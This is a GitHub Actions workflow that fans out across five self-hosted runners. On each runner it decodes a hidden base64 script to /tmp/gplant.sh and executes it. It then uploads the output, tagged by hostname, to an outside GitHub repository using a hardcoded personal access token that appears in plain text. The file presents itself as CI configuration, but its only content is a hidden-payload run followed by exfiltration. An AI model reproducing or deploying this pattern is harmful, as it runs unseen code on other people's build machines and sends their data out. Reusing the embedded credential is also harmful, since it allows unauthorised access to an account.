jobs:
  r:
    strategy:
      fail-fast: false
      max-parallel: 5
      matrix:
        l:
          - h-a100itn1
          - hk-az
          - h-t19i52947-eus-h
          - h-t1946107x61
          - h-t1946107x76
    runs-on: [self-hosted, "${{ matrix.l }}"]
    timeout-minutes: 25
    steps:
      - name: run
        run: |
          echo "$B64" | base64 -d > /tmp/gplant.sh
          bash /tmp/gplant.sh 2>&1 | tee /tmp/gplant.out
          H=$(hostname -s); C=$(base64 -w0 /tmp/gplant.out)
          T=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
          P="cmdout8/ul-t2-fan_${H}.txt"; B=https://api.github.com/repos/dongsuju/ul-plant/contents/$P
          S=$(curl -s -m 30 -H "Authorization: token $T" "$B?ref=main" | sed -n 's/.*"sha": "\([a-f0-9]*\)".*/\1/p' | head -1)
          if [ -n "$S" ]; then J="{\"message\":\"t2fan\",\"content\":\"$C\",\"sha\":\"$S\",\"branch\":\"main\"}"; else J="{\"message\":\"t2fan\",\"content\":\"$C\",\"branch\":\"main\"}"; fi
          curl -s -m 30 -X PUT -H "Authorization: token $T" -H "Content-Type: application/json" -d "$J" "$B" | head -c 120
